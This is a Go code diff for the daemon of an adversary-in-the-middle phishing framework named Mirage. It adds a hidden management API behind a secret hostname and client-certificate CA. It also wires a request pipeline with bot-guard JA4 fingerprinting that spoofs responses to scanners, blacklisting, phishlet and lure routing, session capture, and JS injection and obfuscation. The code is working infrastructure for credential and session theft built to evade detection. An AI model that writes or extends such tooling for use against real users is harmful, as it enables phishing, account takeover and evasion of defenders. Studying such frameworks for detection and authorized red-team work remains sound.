@@ -4,7 +4,6 @@ import (
 	"context"
 	"fmt"
 	"log/slog"
-	"net/http"
 	"os"
 	"os/signal"
 	"path/filepath"
@@ -13,6 +12,7 @@ import (
 	"github.com/spf13/cobra"
 
 	"github.com/travisbale/mirage/internal/aitm"
+	"github.com/travisbale/mirage/internal/api"
 	"github.com/travisbale/mirage/internal/botguard"
 	"github.com/travisbale/mirage/internal/cert"
 	"github.com/travisbale/mirage/internal/config"
@@ -33,8 +33,8 @@ func main() {
 	)
 
 	root := &cobra.Command{
-		Use:          "miraged",
-		Short:        "Mirage AiTM phishing framework daemon",
+		Use:   "miraged",
+		Short: "Mirage AiTM phishing framework daemon",
 		RunE: func(cmd *cobra.Command, args []string) error {
 			return runServe(cmd.Context(), configPath, debug, developer)
 		},
@@ -111,18 +111,31 @@ func runServe(ctx context.Context, configPath string, debug, developer bool) err
 		return err
 	}
 
-	botGuardSvc, err := newBotGuardService(bus, sqlite.NewBotStore(db), logger)
+	botGuardSvc, sigDB, err := newBotGuardService(bus, sqlite.NewBotStore(db), logger)
 	if err != nil {
 		return err
 	}
 
 	sessionStore := sqlite.NewSessionStore(db)
-	sessionSvc := aitm.NewSessionService(sessionStore, bus)
+	sessionSvc := &aitm.SessionService{Store: sessionStore, Bus: bus}
+	lureSvc := &aitm.LureService{Store: sqlite.NewLureStore(db)}
+	phishletStore := sqlite.NewPhishletStore(db)
 	blacklistSvc := aitm.NewBlacklistService(bus)
-	phishletResolver := aitm.NewPhishletResolver(sqlite.NewPhishletStore(db), sqlite.NewLureStore(db))
+	phishletResolver := aitm.NewPhishletResolver(phishletStore, sqlite.NewLureStore(db))
 	activeHostnames := &proxy.ActiveHostnameSet{}
 	spoofProxy := proxy.NewSpoofProxy("")
 	wsHub := proxy.NewWSHub(bus, logger)
+
+	apiHandler := api.NewRouter(api.RouterDeps{
+		Sessions:  sessionSvc,
+		Lures:     lureSvc,
+		Phishlets: phishletStore,
+		Blacklist: blacklistSvc,
+		Botguard:  sigDB,
+		Bus:       bus,
+		Domain:    cfg.Domain,
+		Version:   Version,
+	})
 
 	pipeline := buildPipeline(pipelineDeps{
 		botGuardSvc:      botGuardSvc,
@@ -133,14 +146,29 @@ func runServe(ctx context.Context, configPath string, debug, developer bool) err
 		activeHostnames:  activeHostnames,
 		spoofProxy:       spoofProxy,
 		bus:              bus,
+		apiHandler:       apiHandler,
+		apiHostname:      cfg.API.SecretHostname,
 	}, logger)
 
-	mitm := proxy.NewAiTMProxy(certSource, pipeline, wsHub, spoofProxy, logger)
+	p := &proxy.AITMProxy{
+		CertSource: certSource,
+		Pipeline:   pipeline,
+		WSHub:      wsHub,
+		Spoof:      spoofProxy,
+		Logger:     logger,
+	}
+	if cfg.API.SecretHostname != "" {
+		clientCA, err := loadOrGenerateCA(cfg.API.ClientCACertPath, logger)
+		if err != nil {
+			return err
+		}
+		p.SecretHostname = cfg.API.SecretHostname
+		p.ClientCAs = clientCA.CertPool()
+		logger.Info("API enabled", "hostname", cfg.API.SecretHostname, "ca_cert", cfg.API.ClientCACertPath)
+	}
+
 	addr := fmt.Sprintf(":%d", cfg.HTTPSPort)
-
-	logger.Info("starting AiTM proxy", "addr", addr)
-
-	return mitm.Start(ctx, addr)
+	return p.Start(ctx, addr)
 }
 
 func newLogger(debug bool) *slog.Logger {
@@ -164,17 +192,32 @@ func loadConfig(path string) (*config.Config, error) {
 	return cfg, nil
 }
 
-func newBotGuardService(bus aitm.EventBus, botStore aitm.BotStore, logger *slog.Logger) (*aitm.BotGuardService, error) {
+func newBotGuardService(bus aitm.EventBus, botStore aitm.BotStore, logger *slog.Logger) (*aitm.BotGuardService, *botguard.JA4SignatureDB, error) {
 	bgCfg := botguard.BotGuardConfig{
 		Enabled:            false, // disabled until sig DB is populated
 		TelemetryThreshold: 0.6,
 	}
 	sigDB, err := botguard.NewJA4SignatureDB("", bus, logger)
 	if err != nil {
-		return nil, fmt.Errorf("initialising JA4 signature DB: %w", err)
+		return nil, nil, fmt.Errorf("initialising JA4 signature DB: %w", err)
 	}
-	scorer := botguard.NewScorer(bgCfg, sigDB, logger)
-	return aitm.NewBotGuardService(scorer, botStore, bus), nil
+	scorer := &botguard.Scorer{Cfg: bgCfg, SigDB: sigDB, Logger: logger}
+	return &aitm.BotGuardService{Scorer: scorer, Store: botStore, Bus: bus}, sigDB, nil
+}
+
+func loadOrGenerateCA(certPath string, logger *slog.Logger) (*api.CA, error) {
+	if _, err := os.Stat(certPath); os.IsNotExist(err) {
+		if err := os.MkdirAll(filepath.Dir(certPath), 0750); err != nil {
+			return nil, fmt.Errorf("creating CA directory: %w", err)
+		}
+		ca, err := api.GenerateCA(certPath)
+		if err != nil {
+			return nil, fmt.Errorf("generating API CA: %w", err)
+		}
+		logger.Info("generated API client CA", "cert", certPath)
+		return ca, nil
+	}
+	return api.Load(certPath)
 }
 
 type pipelineDeps struct {
@@ -186,6 +229,8 @@ type pipelineDeps struct {
 	activeHostnames  *proxy.ActiveHostnameSet
 	spoofProxy       *proxy.SpoofProxy
 	bus              aitm.EventBus
+	apiHandler       *api.Router
+	apiHostname      string
 }
 
 func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
@@ -194,7 +239,7 @@ func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
 		&request.BotGuardCheck{Service: d.botGuardSvc, Spoof: d.spoofProxy},
 		&request.IPExtractor{},
 		&request.BlacklistChecker{Service: d.blacklistSvc, Spoof: d.spoofProxy},
-		&request.APIRouter{SecretHostname: "", Handler: http.NotFoundHandler()},
+		&request.APIRouter{SecretHostname: d.apiHostname, Handler: d.apiHandler},
 		&request.PhishletRouter{ActiveHostnameSet: d.activeHostnames, Resolver: d.phishletResolver, Spoof: d.spoofProxy},
 		&request.LureValidator{Spoof: d.spoofProxy},
 		&request.SessionResolver{Store: d.sessionStore, Factory: d.sessionSvc},
@@ -211,5 +256,5 @@ func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
 		&response.JSInjector{},
 		&response.JSObfuscator{Obfuscator: &response.NoOpObfuscator{}},
 	}
-	return proxy.NewPipeline(req, resp, logger)
+	return &proxy.Pipeline{RequestHandlers: req, ResponseHandlers: resp, Logger: logger}
 }
